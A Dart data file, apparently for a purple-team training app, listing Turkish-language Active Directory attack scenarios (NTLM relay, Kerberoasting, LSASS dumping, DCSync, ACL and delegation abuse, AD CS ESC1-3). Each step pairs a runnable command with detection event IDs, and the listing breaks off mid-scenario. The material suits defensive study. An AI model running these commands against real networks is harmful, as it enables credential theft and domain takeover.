class ScenarioStep {
  final int stepNumber;
  final String title;
  final String tactic; // MITRE ATT&CK Taktik
  final String description;
  final String tool;
  final String command;
  final String detection; // Event ID & Tespit İmzası

  const ScenarioStep({
    required this.stepNumber,
    required this.title,
    required this.tactic,
    required this.description,
    required this.tool,
    required this.command,
    required this.detection,
  });
}

class AttackScenario {
  final String id;
  final String title;
  final String difficulty; // Başlangıç, Orta, İleri Seviye
  final String category; // Keşif, Kimlik Erişimi, Yanal Hareket, Yetki Yükseltme, AD CS, Kalıcılık, Trust
  final String description;
  final List<String> tags;
  final List<ScenarioStep> steps;

  const AttackScenario({
    required this.id,
    required this.title,
    required this.difficulty,
    required this.category,
    required this.description,
    required this.tags,
    required this.steps,
  });
}

const List<AttackScenario> kDefaultScenarios = [
  // 1. LLMNR / NBT-NS Zehirleme ve SMB Relay
  AttackScenario(
    id: 'sc_llmnr_relay',
    title: 'LLMNR/NBT-NS Zehirleme ve SMB/LDAP Relay ile Sistem Ele Geçirme',
    difficulty: 'Başlangıç',
    category: 'NTLM & Relay',
    description: 'İç ağda LLMNR/NBT-NS multicast isteklerini Responder ile dinleyip yakalanan NTLMv2 kimlik doğrulamasını SMB signing zorunluluğu olmayan sunuculara veya LDAP\'a relay ederek yerel yönetici veya DCSync hakkı elde etme senaryosu.',
    tags: ['Responder', 'NTLM Relay', 'LLMNR', 'ntlmrelayx', 'Credential Access', 'Lateral Movement'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'SMB Signing ve Relay Hedeflerinin Tespiti',
        tactic: 'Reconnaissance',
        description: 'Ağdaki bilgisayarlarda SMB signing ayarı taranarak signing gerektirmeyen (signing: False) savunmasız hedefler bir hedef listesine kaydedilir.',
        tool: 'NetExec / CME',
        command: r'nxc smb 192.168.1.0/24 --gen-relay-list targets.txt',
        detection: 'SMB port (445) üzerinde anormal tarama trafiği, Event ID 4625 (oturum açma denemeleri).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Responder ile LLMNR / NBT-NS Zehirlemeyi Başlatma',
        tactic: 'Credential Access',
        description: 'Responder aracı SMB ve HTTP sunucuları kapalı tutularak yalnızca isim çözümleme taleplerini yakalayacak şekilde çalıştırılır.',
        tool: 'Responder',
        command: r'sudo responder -I eth0 -dwv',
        detection: 'Ağ IDS/IPS sistemlerinde anormal LLMNR (UDP 5355) ve NetBIOS-NS (UDP 137) broadcast trafiği.',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'ntlmrelayx ile Kimlik Doğrulamasını Hedefe Yönlendirme (Relay)',
        tactic: 'Privilege Escalation & Lateral Movement',
        description: 'Yakalanan kimlik doğrulaması hedefe relay edilir ve başarılı oturumda SAM veritabanı dökülür veya SOCKS proxy açılır.',
        tool: 'Impacket ntlmrelayx',
        command: r'impacket-ntlmrelayx -tf targets.txt -smb2support -socks',
        detection: 'Event ID 4624 (Logon Type 3, NTLM Kimlik Doğrulama, Kaynak IP saldırgan IP\'si olarak görünür).',
      ),
      ScenarioStep(
        stepNumber: 4,
        title: 'Proxychains ile Hedef Makinede Komut Çalıştırma',
        tactic: 'Execution',
        description: 'Relay ile açılan SOCKS tüneli üzerinden hedef makineye smbexec veya wmiexec ile bağlanılır.',
        tool: 'smbexec.py / Proxychains',
        command: r'proxychains impacket-smbexec administrator@192.168.1.50',
        detection: 'Event ID 7045 (Yeni Servis Oluşturuldu: BokuService / ServiceControlManager), Sysmon Event ID 1.',
      ),
    ],
  ),

  // 2. mitm6 ile IPv6 DNS Zehirleme
  AttackScenario(
    id: 'sc_mitm6_relay',
    title: 'mitm6 ile IPv6 DNS Zehirleme ve LDAP Relay ile Domain Admin',
    difficulty: 'Orta',
    category: 'NTLM & Relay',
    description: 'Windows istemcilerinin varsayılan olarak IPv6 aramasını istismar ederek sahte DHCPv6 sunucusu kurma ve makinelerin kimlik doğrulamasını LDAP/LDAPS üzerine relay ederek yeni Domain Admin oluşturma.',
    tags: ['mitm6', 'IPv6', 'LDAP Relay', 'DHCPv6', 'Credential Access'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'ntlmrelayx ile LDAP Üzerine Yeni Kullanıcı Ekleme Modu',
        tactic: 'Privilege Escalation',
        description: 'LDAP relay dinleyicisi başlatılır ve başarılı kimlik doğrulamada domainde yeni bir kullanıcı oluşturup Enterprise Admins grubuna eklemesi söylenir.',
        tool: 'ntlmrelayx',
        command: r'impacket-ntlmrelayx -t ldap://dc01.domain.local --escalate-user eviluser -smb2support',
        detection: 'Event ID 4720 (A user account was created: eviluser), Event ID 4728 (Member added to group).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'mitm6 ile Sahte DHCPv6 ve DNS Sunucusu Başlatma',
        tactic: 'Man-in-the-Middle',
        description: 'Ağ arayüzünde DHCPv6 yanıtları gönderilerek makinelerin DNS sunucusu olarak saldırgan IP\'si atanır.',
        tool: 'mitm6',
        command: r'sudo mitm6 -d domain.local -i eth0',
        detection: 'Ağda yoğun DHCPv6 Advertise / Reply paketleri ve anormal WPAD DNS sorguları.',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Hedef Makinenin WPAD / WebClient Üzerinden Bağlanması',
        tactic: 'Initial Access',
        description: 'Kurban makine ağ ayarlarını yenilediğinde otomatik olarak saldırgan proxy\'sine NTLM ile kimlik doğrular.',
        tool: 'Windows WebClient / WPAD',
        command: r'# Kurban makine internete çıkmaya çalıştığında veya yeniden başladığında otomatik tetiklenir',
        detection: 'Event ID 4624 (Logon Type 3 NTLM), DNS Sorgu Logları.',
      ),
      ScenarioStep(
        stepNumber: 4,
        title: 'Oluşturulan Yeni Admin ile Domain Yönetimi',
        tactic: 'Dominance',
        description: 'Eklenen eviluser hesabı ile DCSync veya WMI oturumu açılarak domain kontrol edilir.',
        tool: 'NetExec',
        command: r'nxc smb dc01.domain.local -u eviluser -p "Password123!"',
        detection: 'Event ID 4672 (Special privileges assigned to new logon).',
      ),
    ],
  ),

  // 3. Parola Püskürtme (Password Spraying)
  AttackScenario(
    id: 'sc_password_spray',
    title: 'Akıllı Parola Püskürtme (Password Spraying) ile İlk Erişim',
    difficulty: 'Başlangıç',
    category: 'Kimlik Erişimi',
    description: 'Etki alanındaki hesap kilitleme politikasını (Lockout Policy) aşmadan, tespit edilmeyen aralıklarla yaygın parolalar püskürterek geçerli kullanıcı kimliği ele geçirme.',
    tags: ['Password Spray', 'NetExec', 'Lockout Threshold', 'Initial Access'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Domain Parola ve Kilitleme Politikasını Çekme',
        tactic: 'Reconnaissance',
        description: 'Hesapların kilitlenmemesi için LockoutThreshold ve LockoutDuration süreleri anonim veya LDAP üzerinden sorgulanır.',
        tool: 'NetExec / enum4linux-ng',
        command: r'nxc smb 192.168.1.10 -u "" -p "" --pass-pol',
        detection: 'Event ID 4625 (Başarısız oturum denemesi), NetrUserGetInfo sorgusu.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Geçerli Kullanıcı Listesi Çıkarma',
        tactic: 'Discovery',
        description: 'RPC, Kerbrute veya LDAP üzerinden domaindeki tüm sAMAccountName listesi toplanır.',
        tool: 'kerbrute',
        command: r'kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt -o valid_users.txt',
        detection: 'Event ID 4768 (Audit Failure, Status: 0x6 Client not found in Kerberos database).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Mevsimsel Tek Parola Püskürtme (Smart Spray)',
        tactic: 'Credential Access',
        description: 'Her hesaba sadece bir kez "Sonbahar2024!" veya "Password123" denenir, böylece kilitlenme sayacı tetiklenmez.',
        tool: 'NetExec smb spray',
        command: r'nxc smb 192.168.1.10 -u valid_users.txt -p "Sonbahar2024!" --continue-on-success',
        detection: 'Event ID 4625 ve 4624 (Farklı kullanıcılardan eşzamanlı tek oturum denemeleri).',
      ),
    ],
  ),

  // 4. Kerberoasting & AS-REP Roasting ile Domain Admin
  AttackScenario(
    id: 'sc_kerberos_to_da',
    title: 'Standart Kullanıcıdan Domain Admin\'e (Kerberos Yolu)',
    difficulty: 'Orta',
    category: 'Kerberos',
    description: 'Ağ içi sıfır yetkili bir noktadan başlayarak AS-REP Roasting, Kerberoasting ve elde edilen Domain Admin yetkisi ile DCSync gerçekleştirme zinciri.',
    tags: ['Kerberos', 'AS-REP', 'Kerberoast', 'DCSync', 'Credential Access', 'Privilege Escalation'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Pre-Authentication Kapalı Hesapların Tespiti (AS-REP Roasting)',
        tactic: 'Credential Access',
        description: 'Pre-auth gerektirmeyen (DONT_REQ_PREAUTH) hesaplar adına TGT talep edilir ve parola hash\'i yakalanır.',
        tool: 'Impacket GetNPUsers.py',
        command: r'python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt',
        detection: 'Event ID 4768 (Ticket Encryption: 0x17 RC4, Pre-Auth Type: 0).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Servis Hesaplarını Suistimal Etme (Kerberoasting)',
        tactic: 'Credential Access',
        description: 'SPN (Service Principal Name) tanımlı servis hesapları için TGS bileti istenir ve offline kırmak üzere kaydedilir.',
        tool: 'GetUserSPNs.py / Rubeus',
        command: r'python3 GetUserSPNs.py domain.local/user:pass -request -outputfile kerb.txt',
        detection: 'Event ID 4769 (Ticket Encryption: 0x17 RC4 Downgrade, Servis Adı Krbtgt harici SPN).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Hashcat ile Parola Kırma (Offline Brute-Force)',
        tactic: 'Credential Access',
        description: 'Elde edilen Kerberos biletleri Hashcat 13100 (Kerberoasting) veya 18200 (AS-REP) modunda kırılır.',
        tool: 'Hashcat',
        command: r'hashcat -m 13100 kerb.txt wordlist.txt -r rules/best64.rule --force',
        detection: 'Sistem loglarında iz bırakmaz (Tamamen offline yürütülen bir işlemdir).',
      ),
      ScenarioStep(
        stepNumber: 4,
        title: 'Domain Controller\'dan DCSync ile KRBTGT Çıkarımı',
        tactic: 'Credential Access & Dominance',
        description: 'Replication haklarına sahip servis hesabı ile DRSUAPI taklit edilerek KRBTGT NTLM hash\'i çekilir.',
        tool: 'secretsdump.py',
        command: r'python3 secretsdump.py -just-dc-user krbtgt domain.local/svc_sql:Password123@192.168.1.10',
        detection: 'Event ID 4662 (Access Mask: 0x100 DS-Replication-Get-Changes-All).',
      ),
    ],
  ),

  // 5. LSASS Memory Dump & Pass-the-Hash
  AttackScenario(
    id: 'sc_pth_lateral',
    title: 'LSASS Bellek Dökümü ve Pass-the-Hash ile Yanal Hareket',
    difficulty: 'Orta',
    category: 'Yanal Hareket',
    description: 'Yerel yönetici olunan bir iş istasyonunda LSASS sürecinin belleği dökülerek oturum açmış kullanıcıların NTLM hash ve Kerberos biletlerinin ele geçirilmesi ve ağda yayılma.',
    tags: ['LSASS', 'Pass-the-Hash', 'Pass-the-Ticket', 'Lateral Movement', 'CrackMapExec', 'Mimikatz'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'LSASS Sürecinin Belleğini Dökme (Memory Dump)',
        tactic: 'Credential Access',
        description: 'Windows Defender\'ı atlatmak için yerleşik comsvcs.dll veya procdump kullanılarak lsass.exe bellek dökümü alınır.',
        tool: 'rundll32 / comsvcs.dll',
        command: r'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\lsass.dmp full',
        detection: 'Sysmon Event ID 10 (ProcessAccess to lsass.exe, GrantedAccess 0x1010 veya 0x1FFFFF).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Döküm Dosyasından NTLM Hash ve Kerberos Biletlerini Çıkarma',
        tactic: 'Credential Access',
        description: 'Alınan .dmp dosyası pypykatz ile çevrimdışı analiz edilerek yönetici NTLM hash\'leri çekilir.',
        tool: 'pypykatz',
        command: r'pypykatz lsa minidump C:\Windows\Temp\lsass.dmp',
        detection: 'Çevrimdışı işlem olduğundan ağda tespit edilmez.',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Pass-the-Hash (PtH) ile Ağdaki Diğer Sunuculara Erişim',
        tactic: 'Lateral Movement',
        description: 'Düz metin parola yerine elde edilen NTLM hash doğrudan kimlik doğrulamada kullanılır.',
        tool: 'NetExec / Wmiexec',
        command: r'nxc smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881',
        detection: 'Event ID 4624 (Logon Type 3 veya 9, Logon Process: Advapi / NTLM, Key Length: 0).',
      ),
    ],
  ),

  // 6. DPAPI & Credential Vault Hasadı
  AttackScenario(
    id: 'sc_dpapi_vault',
    title: 'DPAPI ve Windows Credential Vault / Tarayıcı Parola Hasadı',
    difficulty: 'Orta',
    category: 'Kimlik Erişimi',
    description: 'Hedef iş istasyonunda DPAPI master key\'lerini çözerek Chrome, Edge, RDP, KeePass ve Windows Kimlik Bilgisi Kasasındaki açık metin kurumsal parolaları elde etme.',
    tags: ['DPAPI', 'Credential Vault', 'DonPAPI', 'Mimikatz', 'Browser Passwords'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Hedef Kullanıcının DPAPI Master Key\'lerini Çözme',
        tactic: 'Credential Access',
        description: 'Kullanıcının NTLM hash\'i veya etki alanı backup key\'i ile DPAPI anahtarları çözümlenir.',
        tool: 'DonPAPI / Mimikatz',
        command: r'python3 DonPAPI.py domain.local/user:pass@192.168.1.50',
        detection: 'Event ID 4692 (Backup of data protection master key was attempted).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Tarayıcı ve Windows Vault Şifrelerini Açma',
        tactic: 'Credential Access',
        description: 'Çözülen master key ile AppData altındaki Web Data, Login Data ve Credentials dosyaları deşifre edilir.',
        tool: 'SharpDPAPI',
        command: r'SharpDPAPI.exe passwords /unprotect',
        detection: 'Sysmon Event ID 11 (File creation/read in AppData\\Local\\Microsoft\\Credentials).',
      ),
    ],
  ),

  // 7. ACL GenericAll / GenericWrite
  AttackScenario(
    id: 'sc_acl_genericall',
    title: 'ACL GenericAll / GenericWrite ile Grup ve Hesap Manipülasyonu',
    difficulty: 'İleri Seviye',
    category: 'Yetki Yükseltme',
    description: 'BloodHound ile tespit edilen zafiyetli Active Directory Access Control Entry (ACE) haklarını kullanarak standart hesaba Domain Admin yetkisi kazandırma.',
    tags: ['BloodHound', 'ACL', 'GenericAll', 'WriteDACL', 'Privilege Escalation'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'BloodHound ile İzin ve Güven İlişkilerini Haritalama',
        tactic: 'Reconnaissance',
        description: 'Domain ortamındaki tüm kullanıcı, grup, bilgisayar, GPO ve ACL ilişkileri toplanır.',
        tool: 'bloodhound-python',
        command: r'bloodhound-python -d domain.local -u user -p pass -c All -ns 192.168.1.10',
        detection: 'LDAP sorguları (Event ID 1644: Expensive/Inefficient LDAP Queries).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'WriteDACL Yetkisi ile Hedef Gruba FullControl Hakkı Tanımlama',
        tactic: 'Privilege Escalation',
        description: 'Domain Admins veya korumalı bir grup üzerindeki WriteDACL yetkisi istismar edilerek saldırgan hesabı için GenericAll eklenir.',
        tool: 'dacledit.py',
        command: r'python3 dacledit.py -action write -rights FullControl -principal attacker_user -target "Domain Admins" domain.local/user:pass',
        detection: 'Event ID 4662 (Access Mask: WRITE_DAC, Object Type: Group).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Hedef Gruba Üye Ekleme',
        tactic: 'Privilege Escalation',
        description: 'Kazanılan GenericAll hakkı ile saldırgan hesabı doğrudan Domain Admins grubuna dahil edilir.',
        tool: 'net group / PowerView',
        command: r'net group "Domain Admins" attacker_user /add /domain',
        detection: 'Event ID 4728 (A member was added to a security-enabled global group: Domain Admins).',
      ),
    ],
  ),

  // 8. WriteOwner ile Nesne Sahipliğini Ele Geçirme
  AttackScenario(
    id: 'sc_acl_writeowner',
    title: 'WriteOwner ACE İstismarı ile Obje Sahipliğini Çalma',
    difficulty: 'İleri Seviye',
    category: 'Yetki Yükseltme',
    description: 'Bir grup veya yönetici nesnesi üzerinde WriteOwner iznine sahip bir saldırganın, nesnenin sahibini (Owner) kendi hesabı yapıp ardından tüm DACL haklarını kendine tahsis etmesi.',
    tags: ['WriteOwner', 'ACL', 'Privilege Escalation', 'owneredit.py'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Nesne Sahipliğini Saldırgan Hesabına Aktarma',
        tactic: 'Privilege Escalation',
        description: 'WriteOwner yetkisi ile hedef nesnenin nTSecurityDescriptor Owner SID\'i saldırgan SID\'i ile değiştirilir.',
        tool: 'owneredit.py',
        command: r'python3 owneredit.py -action write -new-owner attacker_user -target "IT-Admins" domain.local/user:pass',
        detection: 'Event ID 4662 (Access Mask: WRITE_OWNER).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Yeni Sahip Olarak FullControl ACE Ekleme',
        tactic: 'Privilege Escalation',
        description: 'Nesne sahibi olan hesap her zaman DACL değiştirme hakkına sahiptir.',
        tool: 'dacledit.py',
        command: r'python3 dacledit.py -action write -rights FullControl -principal attacker_user -target "IT-Admins" domain.local/user:pass',
        detection: 'Event ID 4662 (Access Mask: WRITE_DAC).',
      ),
    ],
  ),

  // 9. RBCD (Resource-Based Constrained Delegation)
  AttackScenario(
    id: 'sc_rbcd_delegation',
    title: 'RBCD ile Hedef Sunucuda SYSTEM Yetkisi Ele Geçirme',
    difficulty: 'İleri Seviye',
    category: 'Delegasyon',
    description: 'MachineAccountQuota kullanarak yeni bir bilgisayar hesabı oluşturup, hedef sunucunun msDS-AllowedToActOnBehalfOfOtherIdentity özniteliğini değiştirerek SYSTEM olma yolu.',
    tags: ['RBCD', 'Delegation', 'S4U2self', 'S4U2proxy', 'Privilege Escalation'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'MachineAccountQuota ile Sahte Bilgisayar Hesabı Ekleme',
        tactic: 'Resource Development',
        description: 'Standart kullanıcıların 10 adede kadar makine hesabı ekleme hakkı kullanılarak domain\'e sahte makine katılır.',
        tool: 'addcomputer.py',
        command: r'python3 addcomputer.py domain.local/user:pass -computer-name FAKE_PC$ -computer-pass Password123',
        detection: r'Event ID 4741 (A computer account was created: FAKE_PC$).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Hedef Sunucunun RBCD Özniteliğini Değiştirme',
        tactic: 'Persistence & Defense Evasion',
        description: 'Hedef sunucu üzerindeki WriteProperty yetkisi kullanılarak sahte makine hesabı delegasyon listesine yazılır.',
        tool: 'rbcd.py',
        command: r'python3 rbcd.py -delegate-to TARGET_SRV$ -delegate-from FAKE_PC$ -action write domain.local/user:pass',
        detection: 'Event ID 5136 (Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity değiştirildi).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'S4U2self & S4U2proxy ile Hedef Sunucu Adına Bilet Üretme',
        tactic: 'Credential Access',
        description: 'Administrator kullanıcısı adına hedef makinedeki CIFS servisi için sahte TGS bileti talep edilir.',
        tool: 'getST.py',
        command: r'python3 getST.py -spn cifs/TARGET_SRV.domain.local -impersonate Administrator domain.local/FAKE_PC$:Password123',
        detection: 'Event ID 4769 (S4U Kerberos Service Ticket Request, TransitedServices).',
      ),
      ScenarioStep(
        stepNumber: 4,
        title: 'Alınan Bilet ile Hedefte SYSTEM Komut Çalıştırma',
        tactic: 'Execution',
        description: 'TGS bileti ortam değişkenine aktarılarak smbexec ile hedef sunucu üzerinde oturum açılır.',
        tool: 'impacket-smbexec',
        command: r'export KRB5CCNAME=Administrator.ccache && impacket-smbexec -k -no-pass TARGET_SRV.domain.local',
        detection: 'Event ID 4624 (Logon Type 3 Kerberos, Administrator), Event ID 7045.',
      ),
    ],
  ),

  // 10. Unconstrained Delegation & PrinterBug
  AttackScenario(
    id: 'sc_unconstrained_printerbug',
    title: 'Unconstrained Delegation & PrinterBug ile DC Ele Geçirme',
    difficulty: 'İleri Seviye',
    category: 'Delegasyon',
    description: 'Unconstrained Delegation (TRUSTED_FOR_DELEGATION) özelliğine sahip bir sunucu ele geçirildikten sonra SpoolSample (PrinterBug) ile Domain Controller\'ı zorlayarak DC makine hesabının TGT biletini yakalama.',
    tags: ['Unconstrained Delegation', 'SpoolSample', 'PrinterBug', 'Rubeus', 'Privilege Escalation'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Unconstrained Sunucuda Rubeus Monitor Başlatma',
        tactic: 'Credential Access',
        description: 'Ele geçirilen sunucuda LSASS belleğine düşecek olan Kerberos TGT biletlerini yakalamak için Rubeus monitor modunda başlatılır.',
        tool: 'Rubeus.exe',
        command: r'Rubeus.exe monitor /interval:5 /filteruser:DC01$',
        detection: 'Sysmon Event ID 10 (ProcessAccess to lsass.exe), Event ID 4688.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'SpoolSample (MS-RPRN) ile DC\'den Kimlik Doğrulama Tetikleme',
        tactic: 'Lateral Movement',
        description: 'Yazdırma kuyruğu servisi RPC protokolü üzerinden DC\'nin saldırgan kontrolündeki sunucuya bağlanması zorlanır.',
        tool: 'dementor.py / SpoolSample',
        command: r'python3 dementor.py -u user -p pass -d domain.local UNCONSTRAINED_SRV DC01.domain.local',
        detection: 'Ağ seviyesinde Named Pipe: \\pipe\\spoolss bağlantısı, Event ID 5145.',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Yakalanan DC TGT Biletini Belleğe Enjekte Etme (Pass-the-Ticket)',
        tactic: 'Lateral Movement',
        description: r'Rubeus tarafından yakalanan DC01$ TGT bileti yerel oturuma enjekte edilir.',
        tool: 'Rubeus.exe',
        command: r'Rubeus.exe ptt /ticket:<BASE64_DC_TGT_TICKET>',
        detection: 'Event ID 4768 (TGT request for machine account).',
      ),
      ScenarioStep(
        stepNumber: 4,
        title: r'DC01$ Kimliği ile DCSync Gerçekleştirme',
        tactic: 'Credential Access',
        description: 'Domain Controller makine hesabı replication haklarına sahip olduğundan tüm domain hash\'leri çekilir.',
        tool: 'mimikatz / secretsdump',
        command: r'mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt',
        detection: 'Event ID 4662 (DS-Replication-Get-Changes-All).',
      ),
    ],
  ),

  // 11. Constrained Delegation (S4U2self & S4U2proxy)
  AttackScenario(
    id: 'sc_constrained_s4u',
    title: 'Geleneksel Kısıtlı Delegasyon (Constrained Delegation) İstismarı',
    difficulty: 'İleri Seviye',
    category: 'Delegasyon',
    description: 'msDS-AllowedToDelegateTo özniteliğine sahip bir servis hesabı ele geçirildiğinde, S4U2self ve S4U2proxy uzantıları kullanılarak hedef serviste Domain Admin kimliğine bürünme.',
    tags: ['Constrained Delegation', 'S4U2self', 'S4U2proxy', 'Krb5', 'Privilege Escalation'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Delegasyon İzinli Hesapların Tespiti',
        tactic: 'Reconnaissance',
        description: 'LDAP üzerinden msDS-AllowedToDelegateTo özniteliği dolu olan kullanıcı ve bilgisayar hesapları listelenir.',
        tool: 'findDelegation.py',
        command: r'python3 findDelegation.py domain.local/user:pass',
        detection: 'LDAP Event ID 1644.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'S4U2self ile Administrator Adına Sahte Bilet Alma',
        tactic: 'Credential Access',
        description: 'Servis hesabı kendi adına Administrator kullanıcısı için sahte bir TGS talep eder.',
        tool: 'getST.py',
        command: r'python3 getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain.local/websvc:Pass123',
        detection: 'Event ID 4769 (Service Name: cifs/TARGET, Ticket Options: 0x40810000).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Hedef Sunucuda Komut Çalıştırma',
        tactic: 'Execution',
        description: 'Elde edilen bilet ccache dosyası olarak kaydedilip smbexec ile yönetici yetkisiyle bağlanılır.',
        tool: 'impacket-smbexec',
        command: r'export KRB5CCNAME=Administrator.ccache && impacket-smbexec -k -no-pass TARGET.domain.local',
        detection: 'Event ID 4624 (Logon Type 3), Event ID 7045.',
      ),
    ],
  ),

  // 12. Bronze Bit (CVE-2020-17049)
  AttackScenario(
    id: 'sc_bronze_bit',
    title: 'Bronze Bit (CVE-2020-17049): Delegasyon Korumasını Aşma',
    difficulty: 'İleri Seviye',
    category: 'Delegasyon',
    description: 'KDC şifrelemesi zayıf ortamlarda, iletilemez (non-forwardable) olarak işaretlenmiş servis biletlerinin içindeki forwardable bit\'ini değiştirerek kısıtlı delegasyon korumalarını atlatma.',
    tags: ['Bronze Bit', 'CVE-2020-17049', 'Kerberos', 'Rubeus'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Korumalı Kullanıcı Adına İletilemez TGS Alma',
        tactic: 'Credential Access',
        description: 'S4U2self ile korumalı kullanıcı adına servis bileti talep edilir (Forwardable biti kapalıdır).',
        tool: 'Rubeus s4u',
        command: r'Rubeus.exe s4u /user:svc_account /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local',
        detection: 'Event ID 4769 (Ticket Options: forwardable kapalı).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Bronze Bit Manipülasyonu ile Bilet Bitini Değiştirme',
        tactic: 'Defense Evasion',
        description: 'Rubeus biletin içindeki iletilebilir bitini açarak KDC\'nin bilet doğrulama mantığını atlatır.',
        tool: 'Rubeus s4u /bronzebit',
        command: r'Rubeus.exe s4u /user:svc_account /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /bronzebit /ptt',
        detection: 'Event ID 4769 (S4U2proxy isteğinde uyumsuz bilet bayrakları).',
      ),
    ],
  ),

  // 13. AD CS ESC1 (SAN Injection)
  AttackScenario(
    id: 'sc_adcs_esc1',
    title: 'AD CS ESC1: SAN Enjeksiyonu ile Anında Domain Admin',
    difficulty: 'Orta',
    category: 'AD CS / Sertifika',
    description: 'Active Directory Certificate Services üzerindeki yanlış yapılandırılmış (Client Authentication + Enrollee Supplies Subject) şablon ile Administrator adına sertifika üretme.',
    tags: ['AD CS', 'PKI', 'ESC1', 'Certipy', 'SAN Injection', 'Privilege Escalation'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Zafiyetli Sertifika Şablonlarını Tarama',
        tactic: 'Reconnaissance',
        description: 'Domain ortamındaki CA sunucuları ve ESC1-ESC13 zafiyetli şablonlar tespit edilir.',
        tool: 'Certipy find',
        command: r'certipy find -vulnerable -u user@domain.local -p Password123 -dc-ip 192.168.1.10',
        detection: 'LDAP sorgusu (CN=Certificate Templates,CN=Public Key Services...).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Administrator Adına Sertifika Talep Etme (SAN Enjeksiyonu)',
        tactic: 'Privilege Escalation',
        description: 'ESC1 şablonu üzerinden Subject Alternative Name (SAN) olarak "Administrator" belirtilerek sertifika istenir.',
        tool: 'Certipy req',
        command: r'certipy req -u user@domain.local -p Password123 -ca CA-NAME -template ESC1_TEMPLATE -upn administrator@domain.local',
        detection: 'CA Event ID 4886 (Sertifika talebi alındı) & 4887 (Sertifika verildi).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Sertifika ile Kerberos TGT ve NT Hash Çıkarımı',
        tactic: 'Credential Access',
        description: 'Üretilen .pfx sertifikası PKINIT üzerinden KDC\'ye sunularak Domain Administrator\'ın NT hash\'i ve TGT bileti alınır.',
        tool: 'Certipy auth',
        command: r'certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10',
        detection: 'Event ID 4768 (Pre-Authentication Type: 16 PKINIT).',
      ),
    ],
  ),

  // 14. AD CS ESC2 (Any Purpose EKU)
  AttackScenario(
    id: 'sc_adcs_esc2',
    title: 'AD CS ESC2: Any Purpose EKU ile Çift Amaçlı Sertifika Üretme',
    difficulty: 'Orta',
    category: 'AD CS / Sertifika',
    description: 'Any Purpose EKU (veya EKU tanımlanmamış) sertifika şablonunu istismar ederek hem istemci doğrulaması hem de alt sertifika otoritesi gibi davranabilen yetkili sertifika çıkarma.',
    tags: ['AD CS', 'ESC2', 'Any Purpose', 'Certipy'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Any Purpose Şablonundan Sertifika Talep Etme',
        tactic: 'Credential Access',
        description: 'Zafiyetli şablon üzerinden standart kullanıcı adına geniş yetkili sertifika alınır.',
        tool: 'Certipy req',
        command: r'certipy req -u user@domain.local -p Password123 -ca CA-NAME -template ESC2_TEMPLATE',
        detection: 'CA Event ID 4886 / 4887.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Sertifikayı İstemci Kimlik Doğrulamasında Kullanma',
        tactic: 'Privilege Escalation',
        description: 'Sertifika PKINIT üzerinden kimlik doğrulamada kullanılarak etki alanı yöneticisine yükselinir.',
        tool: 'Certipy auth',
        command: r'certipy auth -pfx user.pfx -dc-ip 192.168.1.10',
        detection: 'Event ID 4768 (PKINIT).',
      ),
    ],
  ),

  // 15. AD CS ESC3 (Enrollment Agent)
  AttackScenario(
    id: 'sc_adcs_esc3',
    title: 'AD CS ESC3: Sertifika İstek Aracısı (Enrollment Agent) ile Yetki Çalma',
    difficulty: 'İleri Seviye',
    category: 'AD CS / Sertifika',
    description: 'Certificate Request Agent EKU içeren bir şablon üzerinden aracı sertifikası alıp, bu sertifika ile Domain Admin adına ikinci bir istemci doğrulama sertifikası imzalama.',
    tags: ['AD CS', 'ESC3', 'Enrollment Agent', 'Certipy'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Enrollment Agent Sertifikası Talep Etme',
        tactic: 'Credential Access',
        description: 'Sertifika İstek Aracısı EKU\'suna sahip şablon üzerinden bir aracı sertifikası üretilir.',
